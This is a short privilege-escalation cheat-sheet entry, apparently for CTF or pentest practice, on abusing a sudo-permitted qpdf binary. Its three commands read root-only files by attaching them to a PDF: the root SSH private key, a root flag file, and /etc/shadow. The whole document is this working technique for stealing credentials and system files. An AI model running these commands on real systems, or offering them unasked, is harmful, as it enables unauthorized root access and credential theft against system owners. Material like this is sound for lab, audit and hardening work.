# Qpdf privilege escalation

## Sudo

### Usage:

 - sudo /usr/bin/qpdf --qdf --add-attachment /root/.ssh/id_rsa -- --empty ./id_rsa (Get root ssh private key)

 - sudo /usr/bin/qpdf --qdf --add-attachment /root/flag.txt -- --empty ./flag.txt (Get root flag)

 - sudo /usr/bin/qpdf --qdf --add-attachment /etc/shadow -- --empty ./shadow (Get shadow file)



